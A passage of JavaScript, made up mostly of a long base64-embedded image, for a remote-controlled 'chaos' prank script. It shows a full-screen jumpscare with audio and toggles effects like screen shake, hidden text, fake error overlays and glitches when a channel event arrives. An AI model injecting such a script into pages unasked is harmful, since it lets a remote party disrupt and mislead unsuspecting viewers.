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'; // replace with your actual image URL
  img.style.position = 'fixed';
  img.style.top = '0';
  img.style.left = '0';
  img.style.width = '100vw';
  img.style.height = '100vh';
  img.style.objectFit = 'cover'; // ensures full image is shown
  img.style.zIndex = '999999';
  img.id = '__chaos_astolfojumpscare';
  document.body.appendChild(img);

  const audio = document.createElement('audio');
  audio.src = 'https://example.com/jumpscare.mp3'; // optional sound
  audio.autoplay = true;
  audio.id = '__chaos_jobjumpscare_audio';
  document.body.appendChild(audio);

  setTimeout(() => {
    img.remove();
    audio.remove();
  }, 3000); // remove after 3 seconds
}

      };

      const deactivate = {
        videoBomb: () => document.getElementById('__chaos_video')?.remove(),
        shake: () => document.getElementById('__chaos_shake')?.remove(),
        invertColors: () => document.body.style.filter = '',
        blurScreen: () => document.body.style.filter = '',
        zoomIn: () => document.body.style.transform = '',
        zoomOut: () => document.body.style.transform = '',
        flipScreen: () => document.body.style.transform = '',
        hideText: () => document.querySelectorAll('*').forEach(e => e.style.color = ''),
        rainbowText: () => document.getElementById('__chaos_rainbow')?.remove(),
        fakeError: () => document.getElementById('__chaos_error')?.remove(),
        typewriter: () => document.getElementById('__chaos_typewriter')?.remove(),
        broadcast: () => document.getElementById('__chaos_broadcast')?.remove(),
        glitch: () => document.getElementById('__chaos_glitch')?.remove(),
        darkMode: () => document.body.style.background = '',
        lightMode: () => document.body.style.background = ''
      };

      function toggleEffect(action) {
        if (activeEffects.has(action)) {
          deactivate[action]?.();
          activeEffects.delete(action);
        } else {
          activate[action]?.();
          activeEffects.add(action);
        }
      }

      channel.bind('chaos-event', data => {
        toggleEffect(data.action);
      });
    };

    document.body.appendChild(script);
  })();
}
